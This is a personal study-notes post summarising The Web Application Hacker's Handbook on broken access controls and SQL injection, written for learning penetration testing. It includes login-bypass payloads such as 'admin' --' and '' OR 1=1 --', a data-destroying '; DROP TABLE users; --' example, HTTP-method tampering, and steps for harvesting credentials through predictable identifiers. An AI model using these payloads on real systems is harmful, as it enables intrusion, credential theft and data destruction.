**Note:** This is the third installment of my notes and reflections from The Web Application Hacker's Handbook. These reminders are neither exhaustive nor definitive—they're simply a personal tool to help me absorb, understand, and organize new material in a way that works for me.

## Understanding Access Controls:

Access controls are the backbone of an application's security, determining who can access what. Built on authentication and session management, they ensure that only authorized users perform specific actions. However, broken access controls remain one of the most widespread vulnerabilities, affecting over 70% of tested applications. Many systems invest in strong authentication but fail to enforce proper restrictions, leaving critical gaps for attackers to exploit. These flaws allow unauthorized access to data, administrative functions, or restricted actions—often due to design oversights rather than technical failures. This chapter explores the different ways access control weaknesses manifest and how attackers can bypass them to compromise an application.

Access controls come in three flavors: **vertical**, **horizontal**, and **context-dependent**. Vertical controls sort users by roles (like admins versus regular folks), horizontal controls ensure you only see your own data (no peeking at someone else’s mail or bank account), and context-dependent controls keep you on the proper path through an application’s process. When these checks fail, you get scenarios like vertical privilege escalation (where a user does admin stuff), horizontal escalation (where you access someone else’s resources), or even business logic exploits that let you skip steps in a workflow. Sometimes, a crack in one area can spark a chain reaction, granting unauthorized users access that should be off-limits. This chapter dives into each category, revealing common pitfalls and the clever techniques attackers use to exploit these weaknesses.

### Completely Unprotected Functionality:

Sometimes an app only “protects” sensitive functions by hiding the links from regular users, leaving the actual URL completely open. Even if the URL is cryptic, it’s not a secret—it appears in browser histories, logs, and can be uncovered in the client-side code or HTML comments. This design assumes that if users don’t see the admin link, they won’t know the URL, but that’s a risky bet when attackers can easily inspect the code. In essence, relying solely on obscurity without real access checks is a serious vulnerability, as anyone who discovers the URL can misuse powerful functions. For example, consider this naive JavaScript approach:

```
var isAdmin = false;
if (isAdmin)
{
    adminMenu.addltem("/menus/secure/ff457/addNewPortalUser2.jsp", "create a new user");
}
```

Here, the URL is only “protected” by the fact that non-admins don’t see the link, but anyone can inspect the code to reveal it. Relying solely on this kind of obscurity is a major vulnerability since the URL is effectively public.

### Direct Access to Methods:

Sometimes apps expose URLs or parameters that directly trigger remote API methods—often those defined by a Java interface—without proper access control. This typically happens when server-side code is shifted to client-side components (like browser extensions) using method stubs, which means standard methods (like ```getBalance``` or ```isExpired```) become accessible through predictable naming. In theory, calls to these API methods should be as secure as any other server-side resource; however, in practice they often bypass normal security checks. Because clients might interact directly with these methods, they can end up invoking functionality that wasn’t meant for them, either because developers proxy all methods by default or simply overlook which methods should be restricted. For example, if you see a URL like:

```
http://wahh-app.com/public/securityCheck/getCurrentUserRoles
```

you should also look for similar endpoints such as ```getAllUserRoles```, ```getAllRoles```, ```getAllUsers```, and ```getCurrentUserPermissions```, as these might be unintentionally exposed.

### Identifier-Based Functions:

Many applications use resource identifiers passed as parameters to decide what data or functionality to serve. For example, a URL like ```https://wahh-app.com/ViewDocument.php?docid=1280149120``` might be shown only to a document's owner, but if access controls are broken, any user who crafts or discovers that URL can view the document. This vulnerability often crops up when apps interface with external systems that don’t share a unified session-based security model, prompting developers to shortcut robust controls by relying on client-submitted parameters. Whether the identifiers are unpredictable GUIDs or simple sequential numbers, they aren’t secrets—they appear in logs, browser histories, and even client-side code, making them a treasure trove for attackers. The same risk applies when function names are used as parameters: if the access control only checks for the presence of a link in the UI, an attacker who learns the identifier for a sensitive operation might invoke it directly without proper authorization.

### Multistage Functions:

Some app functions unfold over several steps—think of adding a new user where you first select the option from a menu, then choose a department and role, and finally enter user details. Developers often check permissions at the start of the process and assume that anyone reaching later stages is authorized, but that's a risky shortcut. If an attacker jumps straight to the later stages (say, by crafting a request that mimics a hidden form submission), they might bypass the initial check altogether. This flaw can allow unauthorized actions like creating an admin account, giving the attacker full control.

Even high-security systems like online banking are vulnerable if every stage isn’t revalidated. For example, during a funds transfer, the app might confirm that the source account belongs to the user in an early step and then pass that data forward via hidden fields. If the final step doesn’t re-check everything, an attacker could intercept and modify these hidden values—like changing the source account—to transfer funds from another account. This example drives home that every step in a multistage function must enforce its own security checks, rather than relying solely on early validation.

### Static Files:

While dynamic pages perform access checks before serving protected resources, static files—like PDFs or log files stored in the web root—bypass these checks entirely. For example, an online publisher might deliver a purchased ebook via a URL such as ```https://wahh-books.com/download/9780636628104.pdf```, assuming the obscurity of the name (often resembling an ISBN) will protect it. But since static files don’t execute any application logic, anyone who figures out the naming scheme can access them, potentially grabbing all available content. This issue also crops up with other static resources, such as annual reports or software binaries, making it critical to implement proper access controls even for static files.

### Platform Misconfiguration:

Some apps rely on web server or platform-level rules to restrict access to certain URL paths based on a user’s role—think denying non-admins access to the ```/admin``` path. These controls work like firewall rules, checking the HTTP method, URL path, and user role. However, if these rules aren’t set up correctly, unauthorized access can sneak through. For example, an administrative function meant to be accessed only via a POST request might be vulnerable if the platform denies POST but allows GET requests. This issue is compounded by the fact that many application APIs are method-agnostic—that is, frameworks often provide unified access to request parameters (e.g., PHP’s ```$_REQUEST``` or similar mechanisms) without enforcing that the parameters came via GET or POST unless explicitly coded to do so.

It gets even trickier when platforms deny both GET and POST but still process other methods. Consider the HEAD method: by spec, a HEAD request should return the same headers as a GET request, minus the body. Many servers implement HEAD by simply calling the GET handler, meaning if an attacker can trigger a sensitive action using GET, they might achieve the same result with a HEAD request and not even see the response. Even more, some platforms treat unrecognized HTTP methods as GET requests—a sort of “funnel” that captures any unexpected input. In this scenario, denying only known methods is insufficient, as an attacker can use an arbitrary or invalid method to bypass restrictions entirely.

In short, while platform-level controls can be a solid defense, misconfigurations or assumptions—like relying solely on HTTP method restrictions—can create dangerous loopholes. Developers need to ensure that both the platform rules and the application code strictly enforce the correct methods and revalidate the request type, preventing any unforeseen bypasses.

### Parameter-Based Access Control:

Some apps determine a user’s role at login and then pass that info to the client—via a hidden field, cookie, or query parameter—for every subsequent request. For instance, an admin might see a URL like ```https://wahh-app.com/login/home.jsp?admin=true```, while regular users see nothing like that. The problem is that if anyone figures out this parameter, they can simply tack it onto their own requests to gain administrative privileges. This type of vulnerability can be hard to spot unless you're using the app with high-level access, but with some probing for hidden parameters, even a regular user might expose the flaw.

### Referer-Based Access Control:

Some applications try to secure access by relying on the HTTP Referer header. For instance, they might restrict access to the administrative menu based on user privileges, then assume any request coming from that menu must be legitimate for accessing individual admin functions. The flaw here is obvious: since the Referer header is fully under the user's control, anyone can spoof it to make their request look like it originated from the admin page. This method of access control is fundamentally broken and should be avoided in favor of more robust, server-side authentication and authorization checks.

### Location-Based Access Control:

Some businesses use geographic restrictions to comply with regulatory or business requirements, limiting access based on where a user is located—often determined via IP address geolocation. While this might work in theory, these controls are relatively easy to bypass. Attackers can simply use a proxy, VPN, or even manipulate client-side geolocation tools to make it seem like they're in an approved location. In short, relying solely on location for access control is risky and should be supplemented with more robust security measures.

### Attacking Access Controls:

Before you start probing for access control flaws, take a step back and review your application mapping. Understand the intended access control model to pinpoint where vulnerabilities might lurk. Ask yourself:

1. Does the app ensure each user only accesses their own data?

2. Are there distinct roles (managers, supervisors, guests, etc.) with tailored permissions?

3. Do administrators configure and monitor the app using built-in functions?

4. Which functions or data could let you escalate your privileges if misused?

5. Are there URL or POST parameters that indicate access levels? For example, imagine an app where normal users see URLs like:

```
https://app.example.com/dashboard?role=user
```

Admins see:

```
https://app.example.com/dashboard?role=admin
```

As stated before, if the server relies solely on this parameter to grant higher privileges, an attacker who notices the "role" parameter might simply change it from "user" to "admin" in their own request.

Overall, the simplest way to test these controls is by logging in with different user accounts. If, say, one user can access a document while another shouldn’t, try to replicate that request from the other account—using the same URL or POST parameters—to see if horizontal privilege escalation is possible. Modern testing also involves automated tools and manual fuzzing to identify any gaps in server-side validation. Remember, never trust client-supplied values; always ensure that every request is revalidated server-side, regardless of what the client mapping might imply.

#### Comparing Site Maps in Burp Suite for Access Control Testing:

Burp Suite enables testers to map an application's content under two different user contexts, then compare the maps to identify content differences between user roles. This helps pinpoint potential access control vulnerabilities.

To begin, configure Burp as your proxy and disable interception. Browse the application’s content with one user account—preferably the higher-privileged account when testing vertical access controls. Check Burp’s site map to confirm all desired functionality has been mapped. Then, right-click and select "Compare Site Maps".

You can load the second site map from a previously saved state file or have Burp dynamically rerequest it using a new session. For horizontal access control testing (same user level), load the state file for another user’s session. For vertical access control testing (different privilege levels), rerequest the site map as a low-privilege user to ensure thorough coverage. This may require configuring session handling with a login macro or cookie for the low-privilege session and setting scope rules to avoid triggering logout.

The comparison results show color-coded differences: items that were added, removed, or modified. A "diff count" column indicates how many changes are needed to convert one response into the other. Selecting an item highlights the specific differences in both responses.

Interpreting these differences requires human insight into the application's context. For example, minor differences in user-facing elements like menu items are not necessarily a concern. However, if a low-privilege user receives the same response as a high-privilege user for an admin function (e.g., “list users”), it signals a vulnerability. Conversely, different responses don’t always mean access is properly controlled. An administrative page might return random content to both users, still indicating weak access control.

Since automated tools can misinterpret these subtleties, manual analysis is essential. Burp’s site map comparison helps automate data collection while leaving interpretation and vulnerability identification in your hands—ensuring a more accurate assessment of the application’s access controls.

#### Testing Multistage Processes:

The method of comparing application content across different user contexts is often ineffective for testing multistage processes. In these cases, users must follow a specific sequence of requests to complete an action, with the application building a state based on previous actions. Simply rerequesting individual items from the site map may not accurately replicate the process, potentially leading to errors that have nothing to do with access control issues.

Consider an admin function for adding a new user. This might involve multiple steps:

1. Loading the "Add User" form.

2. Submitting the form with the new user's details.

3. Reviewing and confirming the submission.

The application may protect the initial form but fail to apply access controls to the submission or confirmation stages. Each step in the process, including redirections and client-side resubmissions, must be tested independently for proper access control.

For multistage processes involving multiple client-server requests, test each request individually. Cover all request types—form submissions, redirections, and unparameterized requests. Look for points where the application assumes that reaching a specific stage means legitimate access. Try bypassing earlier steps using a lower-privilege account to detect potential privilege escalation.

One manual method is to walk through the process as a privileged user and swap session tokens mid-process to those of a lower-privileged user. This can be done in your proxy:

1. Walk through the full multistage process as a high-privilege user.

2. Log in as a lower-privilege user.

3. In Burp’s Proxy history, find the privileged request sequence.

4. Use the “Request in Browser in Current Browser Session” option in Burp for each request. Paste the generated URL into the browser session of the lower-privilege user.

5. Continue the process to see if the lower-privilege user can complete it. Check both the browser and proxy history for signs of unauthorized access to privileged functionality.

The "Request in Browser" feature uses Burp’s internal web server to generate a unique URL. When this URL is accessed, Burp redirects to the original request, maintaining the Cookie header of the logged-in user. To test different users efficiently:

1. Log in to different browsers (or devices) as separate users.

2. Paste the Burp-generated URL into each session to see how the application handles requests across users.

**Important:** Most browsers share cookies between windows, so use different browser types or machines to avoid cross-session contamination.

Reviewing request sequences side-by-side for different users can help identify subtle discrepancies. To streamline this, you can set up a separate Burp proxy listener for each browser or user session:

1. Point each browser to its respective proxy listener.

2. Open new proxy history windows for each listener.

3. Apply filters to view only requests from each listener, enabling easier comparison.

#### Testing with Limited Access:

When testing access controls with limited access (such as a single user account or none at all), it is essential to adopt a comprehensive strategy to uncover potential vulnerabilities.

**Discovering Hidden Functionality:**

Identifying Unlinked Pages: Poorly protected or outdated pages may not be linked to any user interface but can still be accessible. To find these hidden pages:

1. Content Discovery: Use content discovery tools like Burp Suite’s site map, dirb, gobuster, or ffuf to enumerate all accessible pages and endpoints.

2. Low-Privilege Access: Perform the enumeration as a low-privilege user. You may gain direct access to sensitive functionality that is not properly protected.

Parameter Manipulation: For pages like "Control Panel" or "My Home Page," try adding parameters (e.g., ```?admin=true```) to URLs or POST requests to test for hidden or additional functionality.

Referer Header Testing: Check if access control decisions are based on the ```Referer``` header:

1. Remove or modify the ```Referer``` header for key functions and observe if access is still allowed.

2. Burp’s active scanner can automate this process and flag any issues caused by altering the ```Referer``` header.

Client-Side Code Inspection:

- Review all client-side HTML and JavaScript for references to hidden functionality.

- Decompile browser extensions, if present, to uncover potential server-side endpoints.

**Enumerating and Testing Access Controls:**

Once functionality is identified, test whether user-level segregation is enforced for resources (e.g., documents, orders, emails):

1. Identifier-Based Access:

- Test access to resources by altering identifiers (e.g., document IDs, order numbers).

- Predictable identifiers may allow unauthorized access to other users’ resources.

2. Predictable Identifiers:

- If you can generate new identifiers, analyze them for patterns or sequential numbering.

- Tools like Burp Suite, wfuzz, and custom scripts can help detect predictable sequences.

- If identifiers are not generated or guessable, use any discovered ones to test unauthorized access.

**Note on CUIDs:** A CUID (Collision-Resistant Unique Identifier) is a highly random, long string designed to prevent guessing. If CUIDs are used, guessing attacks are unlikely to succeed.

**Automating Attacks with Predictable Identifiers:**

If identifiers are predictable and access controls are broken:

1. Automated Harvesting: Use Burp Suite Intruder, wfuzz, or custom Python scripts to iterate over identifier ranges and harvest sensitive information.

2. Credential Harvesting: In catastrophic cases, sensitive account details may be transmitted along with masked passwords. If credentials are transmitted in plain text, automated tools can harvest login credentials for all users, including administrators.

**Privilege Escalation via Captured Credentials:**

After harvesting credentials, the next step is to identify administrative accounts:

1. Sequential ID Clues: Administrators often have the lowest account numbers (e.g., user IDs 1, 2, or 3). Log in using these IDs to check for administrative privileges.

2. Home Page Access Check: Script a login for each captured credential and attempt to access your own user-specific home page. Administrative users often have access to all users’ home pages, making this a simple test for admin identification.

Updated Modern Example: If user-specific dashboards are present, try accessing a dashboard that displays aggregated data. Often, admin users have broader visibility and additional functionality on such pages.

**Summary:**

To test access controls with limited user access:

- Enumerate all possible pages and resources.

- Manipulate parameters and headers to uncover hidden functionality.

- Test identifier-based access and predictability.

- Automate resource harvesting when identifiers are predictable.

- Use sequential account IDs and page access checks to identify administrative accounts.

#### Testing Direct Access to Methods:

When applications use requests that provide direct access to server-side API methods, access control flaws are typically revealed using previously described methodologies. However, additional testing is required to uncover the presence of unprotected or hidden API methods that might be vulnerable to abuse.

For instance, consider the following request:

```
POST /SVC HTTP/1.1
Accept-Encoding: gzip, deflate
Host: wahh-app
Content-Length: 37

servlet=com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug
```

In this example, the servlet name (```com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug```) could indicate a well-known component. It may be possible to access other servlets by modifying the request to perform unauthorized actions.

**Identifying Vulnerable Methods:**

- Parameter Naming Conventions: Be on the lookout for parameters that follow Java naming conventions, such as methods starting with ```get```, ```set```, ```add```, ```update```, ```is```, or ```has```, followed by a capitalized word (e.g., ```getUserData```). Additionally, parameters that specify a package structure (e.g., ```com.companyname.xxx.yyy.className```) can reveal the internal structure of the application.

- Discovery of Method Lists: Search for methods that may list available interfaces or methods. These may sometimes be exposed as part of normal application behavior but can also be hidden. Check your proxy logs to see if such methods have been called.

**Research and Testing Techniques:**

- Public Resources: Use search engines, documentation, and forum sites to identify other potential methods that may be accessible.

- Attempt Access: Once you have gathered a list of methods, attempt to access them using various user account types, including unauthenticated access. The goal is to identify methods that are improperly protected or exposed.

- Argument Guessing: If you do not know the expected arguments for a method, try calling methods that are less likely to take arguments. Start with generic names like ```listAllUsers```, ```getStatus```, or ```fetchLogs```. Observe how the server responds—error messages may reveal the expected arguments or internal application logic.

**Modern-Day Context:**

In modern applications, REST APIs are often used instead of servlets, but the core testing principles remain the same. Be mindful of:

- Swagger/OpenAPI Documentation: Check for exposed API documentation that may inadvertently reveal all available methods.

- GraphQL Introspection: In GraphQL APIs, introspection queries may list all available methods and types. Ensure this is disabled for non-administrative users.

- Authentication Tokens: Modern APIs often rely on bearer tokens. Attempt to bypass access controls by testing token-less requests or using tokens from other user roles.

#### Testing Restrictions on HTTP Methods:

Modern web applications may inadvertently allow sensitive actions to be performed using unexpected HTTP methods, exposing critical vulnerabilities. Here’s how to identify such weaknesses and maximize your testing:

1. Gather Baseline: Privileged Requests

- Using a high-privileged account, observe sensitive actions (e.g., creating users, resetting passwords, or modifying roles).

- Ensure no anti-CSRF tokens or client-side protections are in place before proceeding. (Applications with CSRF protections often drop requests from unexpected HTTP methods.)

2. Test with Multiple HTTP Methods

- Once you have a target request (e.g., adding a user), attempt to replay it using different HTTP methods:

- POST: Default for data modifications.

- GET: Not typically used for state changes, but some misconfigurations may allow it.

- HEAD: Similar to GET but may still trigger unintended behavior.

- OPTIONS: Often used for CORS (Cross-Origin Resource Sharing) policies but may also return sensitive method info.

- TRACE: Reflects request headers and can inadvertently disclose internal info (especially if cookies or tokens are included).

- Invalid Methods: Submit requests with invalid methods like ```PATCHXYZ``` to see if the application gracefully handles them or mishandles access controls.

Look for unexpected responses, status codes, or altered behavior.

3. Modern Tool Usage

- Burp Suite: Utilize Burp’s “Repeater” to modify methods and replay requests quickly.

- Postman: Easily send requests with any HTTP method, giving you flexibility in testing.

- curl: Command-line fans can use ```curl -X METHOD``` to test method changes manually. Example:

```
curl -X GET "https://example.com/admin/addUser" -H "Authorization: Bearer high-privileged-token"
```

4. Observe Behavior

- Successful action replication using different methods? Huge red flag!

- Partial access or leaked information may indicate method-based vulnerabilities or side-channel information disclosures.

5. Additional Tests for Common Scenarios

- Bypassing Firewalls/WAFs: Some firewalls only monitor ```POST``` or ```GET```, allowing bypasses through unconventional methods like ```PUT``` or ```PATCH```.

- Method Tunneling: Try appending unusual headers (```X-HTTP-Method-Override: PUT```) to manipulate behavior.

6. Exploit Path

If vulnerabilities are confirmed:

- Attempt privilege escalation or unauthorized actions using weaker methods.

- Automate attacks if necessary (e.g., brute-forcing with ```curl``` or scripting repetitive HTTP requests).

Some legacy systems allow user creation via ```POST``` but will also honor ```GET``` under rare circumstances, which could lead to unauthorized user generation. In one case, adding ```?admin=true``` alongside ```GET /createUser``` revealed serious privilege escalation risks!

### Privilege Matrix for Complex Applications:

When designing access control for complex applications, several models are typically employed to manage permissions and prevent unauthorized access. Below is a breakdown of the key models and best practices for each:

1. **Programmatic Control:**

- How It Works: Access decisions are made dynamically using logic embedded in the application code. The privileges are often stored in a database table and checked before allowing access.

- User Role Classification: User roles provide shortcuts for applying privileges but must be programmed for fine-grained control.

- Advantages: Extremely flexible and allows for nuanced access decisions. However, the complexity can make it error-prone if not properly audited or tested.

2. **Discretionary Access Control (DAC):**

- Closed DAC Model: Denies all access unless explicitly granted (stricter but safer).

- Open DAC Model: Allows access unless explicitly revoked (more prone to misconfigurations).

- Use Cases: Often used when administrators need to grant or revoke specific privileges or user account control dynamically.

- Pitfall: Improperly managing user delegation or forgetting to revoke permissions can lead to privilege escalation vulnerabilities.

3. **Role-Based Access Control (RBAC):**

- How It Works: Users are assigned to named roles, each containing a predefined set of privileges. This simplifies access control management. Best Practices:

- Balance Role Granularity: Too many roles become difficult to manage, while too few roles may lead to privilege over-assignment.

- Default-Deny Model: Ensure access is denied by default if no explicit rule is matched (similar to firewall rule design).

- URL/Method Restrictions: Limit which URLs or HTTP methods users in certain roles can access.

- Example: Allowing only administrators to access ```/admin/settings``` via ```POST```, while denying all other requests.

4. **Declarative Control:**

Declarative control enforces access control externally to the application itself. Two key methods are:

a) Restricted Database Accounts

- Different user groups are mapped to specific database accounts, each with the least privileges necessary.

- Defense-in-Depth: Even if the application’s own access control is compromised, restricted database permissions prevent unauthorized actions.

b) Deployment Descriptor Files

These are configuration files (commonly seen in Java EE environments like ```web.xml``` or ```application.xml```) that define access rules during application deployment. They specify roles, URL patterns, and required HTTP methods to control access. Example:

```
<security-constraint>
  <web-resource-collection>
    <web-resource-name>Admin Page</web-resource-name>
    <url-pattern>/admin/*</url-pattern>
    <http-method>POST</http-method>
  </web-resource-collection>
  <auth-constraint>
    <role-name>Administrator</role-name>
  </auth-constraint>
</security-constraint>
```

- Limitations: Descriptor files are static and may not scale well for fine-grained privileges, especially in large applications. They’re often supplemented with programmatic control or database-level restrictions.

**Modern Note:** Many cloud-native or containerized environments now use service meshes and IAM (Identity and Access Management) policies to implement declarative access controls.

### Understanding Access Control Weaknesses in Multi-Layered Applications:

When attacking an application with a multi-layered privilege model, some of the most common mistakes in access controls may already be mitigated. However, there are still multiple avenues to identify potential vulnerabilities:

- **Programmatic Checks:** These checks in the application layer may be susceptible to injection-based attacks, such as SQL injection or command injection, which can bypass access controls.

- **Application Server Roles:** Roles defined at the application server layer are often coarse and may be incomplete. This can lead to privilege escalation when certain permissions or access points are overlooked.

- **File Access Vulnerabilities:** Even if application components run using low-privileged OS accounts, they may still have read access to sensitive data within the host file system. Exploiting arbitrary file access vulnerabilities can allow attackers to access sensitive files, such as configuration files or credential stores.

- **Server Software Vulnerabilities:** Flaws within application server software may allow an attacker to bypass all access controls implemented in the application layer, though access to the database or OS may remain restricted.

- **Privilege Escalation Opportunities:** Finding a single vulnerability, such as the ability to modify a user’s role, could allow an attacker to gain enhanced access across the application and database layers.

Access control defects can range from minor to critical:

- Trivial Vulnerabilities: In some cases, simply accessing an administrative URL may provide unauthorized access to sensitive functions.

- Complex Flaws: Subtle defects in application logic may lurk deep within high-security applications, making them difficult to identify.

Flaws in access controls can arise from poor application design, oversight of protected functions, or flawed assumptions about user behavior. To uncover these defects, it’s essential to test every step of every application function with persistence and patience. The key lesson is to look everywhere—sometimes, the critical bug may be just around the corner.

When designing access control mechanisms:

1. Use default-deny models wherever possible, particularly for roles and permissions assigned to URLs and HTTP methods.

2. Ensure that role definitions are balanced—not too fine-grained, as that makes management cumbersome, but not too broad, which can lead to excessive privileges.

3. Leverage defense-in-depth by implementing declarative controls (e.g., using separate restricted database accounts for different user groups) alongside programmatic checks. This way, even if one layer is breached, other layers provide additional protection.

## Attacking Data Stores:

Nearly all applications rely on data stores to manage essential information such as user accounts, permissions, and configuration settings. Modern data stores are more than passive containers—they use structured formats, predefined query languages, and internal logic to manage data.

Typically, applications access data stores using a common privilege level across all users. If an attacker can manipulate how the application interacts with the data store, they can bypass any application-layer access controls, gaining unauthorized access or modifying critical data.

This principle applies across all data store technologies. Since this is a practical guide, we’ll focus on real-world vulnerabilities in SQL databases, XML repositories, and LDAP directories. Understanding each type of injection provides a foundation for identifying new vulnerabilities. Once you grasp the core concepts of exploitation, you’ll be equipped to develop additional methods for attacking emerging or overlooked injection flaws.

### Injecting into Interpreted Contexts:

Interpreted languages are executed by a runtime component that processes the code and carries out the instructions in real-time. This differs from compiled languages, where code is converted into machine instructions beforehand, which are then executed directly by the processor. Although any language can technically be either interpreted or compiled, many languages used in web development—such as SQL, LDAP, Perl, and PHP—are typically interpreted.

Because of this execution method, a class of vulnerabilities known as **code injection** can arise. Web applications frequently receive and act on user-supplied data, combining it with programmer-written instructions. If an attacker supplies carefully crafted input that breaks out of the intended data context (often using special syntax from the language’s grammar), that input may be executed as program instructions. The result is the execution of arbitrary commands, often leading to the full compromise of the targeted application component.

In contrast, arbitrary command execution in compiled languages typically works differently. These attacks do not exploit language syntax but instead inject machine code directly, bypassing the need for code interpretation entirely.

#### Bypassing a Login:

When a web application accesses a data store, the process is usually identical for both unprivileged users and administrators. The application enforces discretionary access control by constructing queries to retrieve, add, or modify data according to the user’s role. However, a successful injection attack that modifies the query—not just the data it contains—can bypass this control and gain unauthorized access.

If security-critical logic is based on query results, an attacker can manipulate those queries to subvert the application’s behavior. Consider a forms-based login system where user credentials are stored in a database and validated using a simple SQL query:

```
SELECT * FROM users WHERE username = 'marcus' and password = 'secret'  
```

This query retrieves records from the ```users``` table where both the ```username``` and ```password``` match the supplied values. If a record is found, the login is successful, and an authenticated session is created.

To bypass this logic, an attacker can inject malicious input into the username or password field. Suppose the attacker knows the username "admin" exists. They can supply the following input as the username:

```
admin' --
```

This causes the application to execute:

```
SELECT * FROM users WHERE username = 'admin' -- ' and password = 'foo'  
```

The ```--``` comment syntax causes everything after it to be ignored. The query effectively becomes:

```
SELECT * FROM users WHERE username = 'admin'  
```

As a result, the password check is bypassed, and the attacker gains access as the "admin" user.

**Note:** In SQL, the semicolon (```;```) is typically used as a statement terminator, but it's not always required depending on the environment. In *most* web applications, SQL queries are sent as part of the backend code, and the query is typically treated as a single, complete command. Since there’s no batch processing or multiple statements involved, the semicolon isn't strictly necessary. Also, database engines like MySQL, PostgreSQL, and SQL Server will often allow single statements without a ; in this context (if you’re running multiple commands in an interactive shell or script, then the semicolon would be required).

Suppose the attacker does not know the administrator's username. In many applications, the first account created in the database is often an administrative user. This account is typically generated manually during setup and is then used to create additional accounts through the application itself. Moreover, if the query returns details for multiple users, many applications will process only the first returned user. An attacker can exploit this behavior by supplying the following username:

```
' OR 1=1 --
```

This input results in the following query:

```
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'foo'  
```

The comment ```--``` causes the rest of the query, including the password check, to be ignored. The query is thus equivalent to:

```
SELECT * FROM users WHERE username = '' OR 1=1  
```

Here’s the clarification:

- ```username = ''``` is false because no username is blank. However, ```OR 1=1``` is always true.

Because the overall condition is true, the query returns all users from the database. Most applications will process the first returned user, which is often an administrator, effectively granting unauthorized access to that account.

**Note:** This type of attack isn’t limited to SQL databases. Injection into any interpreted query—such as LDAP, XPath, or even custom query languages—can similarly be used to bypass application logic and gain unauthorized access.

Injection into interpreted languages is a broad topic, encompassing many types of vulnerabilities across various web application components. These vulnerabilities depend on the specific interpreted language (e.g., SQL, PHP, LDAP) and the development techniques used by the application’s developers. Regardless of the language or component, the overall approach for detecting and exploiting injection flaws generally follows these steps:

1. **Supply unexpected syntax:** This involves crafting input with special characters or commands that might alter how the interpreter processes the input. For example, injecting ```'; DROP TABLE users; --``` into a login form could terminate the original query and introduce malicious SQL instructions. The goal is to see if the application improperly processes this unexpected syntax.

2. **Observe anomalies:** Look for unusual responses or errors. If the page behaves differently than expected (e.g., returning an error or loading additional content), this may indicate a potential injection point.

3. **Examine error messages:** If error messages are returned, they can reveal valuable clues about how the application is processing your input. For instance, an error like "SQL syntax error near 'DROP TABLE'" shows that the input was interpreted as part of the query, confirming a possible vulnerability.

4. **Systematically modify input:** Adjust your input to confirm or rule out a potential vulnerability. For example, try inserting different characters (```'```, ```"```, ```;```, or ```--```) to test whether they are escaped or processed. Escalate from simple syntax injections to more complex payloads to refine your understanding of how the input is handled.

5. **Proof-of-concept (PoC) test:** Create a test input that performs a harmless, verifiable action. For instance, injecting ```SELECT 'test';``` can help confirm SQL injection without causing damage. If this input succeeds and the word "test" is returned, it proves that the input is being processed as part of the query.

6. **Exploit the vulnerability:** Once confirmed, the final step is to exploit the flaw to achieve your goal (e.g., data extraction or account takeover). This usually involves crafting more complex payloads to manipulate the target system or escalate privileges, leveraging the full capabilities of the interpreted language.

**Example:** Consider a typical login page using an SQL database. An attacker submits:

```
' OR 1=1 --
```

If the page returns an "admin" account or displays a list of all users, this suggests a successful SQL injection attack, bypassing authentication.

#### Injecting into SQL:

Web apps rely heavily on databases to manage user accounts, product details, orders, and more. These databases are queried with SQL—a language for reading, updating, and deleting stored data.

If SQL statements are built insecurely (e.g., directly using user input without validation), attackers can inject malicious SQL commands to access, modify, or delete data. In worst cases, they can even take over the database server.

**The Evolution of SQL Injection:**

- Early Days: SQL injection was once rampant, leading to mass data breaches.

- Modern Defenses: Many apps now use parameterized queries and safer APIs, reducing risk.

- Challenges Today: SQL injection flaws still exist, often in overlooked areas. Perseverance is needed to find these weak spots.

SQL injection principles apply broadly but differ by database:

- Oracle, MS-SQL, MySQL are common targets.

- Minor syntax tweaks or quirks in behavior can significantly affect attack strategies.

- Installing local versions of databases is invaluable for testing syntax and understanding responses. When this isn’t feasible, consider using interactive SQL environments to test queries.

#### Exploiting a Basic SQL Injection Vulnerability:

Many web applications use SQL databases to store and retrieve information. If an application improperly handles user input when constructing SQL queries, it may be vulnerable to SQL injection, allowing attackers to manipulate database queries.

**Example: A Book Retailer’s Search Function**

Imagine a web application that lets users search for books by publisher. When searching for books published by *Wiley*, the application executes:

```
SELECT author, title, year FROM books WHERE publisher = 'Wiley' AND published = 1
```

Here, the application retrieves records where the ```publisher``` is "Wiley" and the ```published``` column has a value of ```1``` (indicating published books).

If a user searches for books by O'Reilly, the query becomes:

```
SELECT author, title, year FROM books WHERE publisher = 'O'Reilly' AND published = 1
```

The problem arises because SQL uses single quotes (```'```) to define string values. The apostrophe in ```"O'Reilly"``` prematurely ends the string, causing an error:

```
Incorrect syntax near 'Reilly'.
Unclosed quotation mark before the character string '
```

This error exposes the application to SQL injection, as an attacker can deliberately inject malicious SQL code.

An attacker could input:

```
Wiley' OR 1=1--  
```

This results in the following query:

```
SELECT author, title, year FROM books WHERE publisher = 'Wiley' OR 1=1--' AND published = 1
```

- The injected ```OR 1=1``` condition ensures that *all* rows are returned since ```1=1``` is always true.

- The ```--``` sequence marks the rest of the query as a comment, effectively nullifying any additional conditions, such as ```published = 1```.

- This allows the attacker to retrieve all books, including unpublished ones.

Instead of using ```--```, an attacker can “balance” the quotes by injecting:

```
Wiley' OR 'a' = 'a
```

Resulting in:

```
SELECT author, title, year FROM books WHERE publisher = 'Wiley' OR 'a'='a' AND published = 1
```

Since ```'a' = 'a'``` always evaluates to ```TRUE```, this effectively bypasses access controls.

Overall, this is just the beginning of SQL injection attacks. A vulnerability like this can lead to:

- Extracting sensitive data (user credentials, payment details, etc.)

- Modifying or deleting database records

- Gaining full control over the database or even the server

SQL injection remains one of the most critical security risks for web applications, requiring strict input validation, parameterized queries, and other mitigation strategies.

### Injecting into Different Statement Types:

The SQL language comprises various verbs that define the nature of a given statement. Among these, ```SELECT``` is the most commonly used, making it the primary target for SQL injection vulnerabilities. Many discussions on SQL injection focus exclusively on ```SELECT``` statements, which can give the mistaken impression that only these statements are vulnerable. In reality, SQL injection can occur in any type of SQL statement. Understanding how injection works across different statement types is crucial for both offensive security and defensive mitigation strategies.

When interacting with a remote application, it is not always immediately clear what type of SQL statement processes user input. However, an educated guess can often be made based on the function of the application. Below, we explore the different types of SQL statements and how they can be exploited.

#### SELECT Statements:

```SELECT``` statements are used to retrieve information from a database. They commonly appear in functionalities where data is displayed in response to user input, such as:

- Browsing a product catalog

- Viewing a user profile

- Performing a search

- Authenticating user credentials in a login form

SQL injection vulnerabilities within ```SELECT``` statements most often occur in the ```WHERE``` clause. This is because user-supplied input is frequently used to define the scope of the query’s results. Since the ```WHERE``` clause is typically the last component of a ```SELECT``` statement, attackers can often use comment symbols (```--``` or ```#```) to truncate the query after injecting their payload, ensuring valid SQL syntax while bypassing intended logic.

